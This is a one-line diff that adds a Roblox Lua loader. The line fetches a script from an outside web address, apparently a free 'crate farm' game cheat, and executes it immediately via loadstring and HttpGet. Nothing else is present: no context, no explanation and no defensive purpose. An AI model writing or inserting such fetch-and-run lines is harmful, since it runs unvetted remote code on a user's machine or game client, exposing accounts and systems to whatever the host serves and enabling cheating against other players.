@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://fayy.gay/cratefarmfree.lua"))()
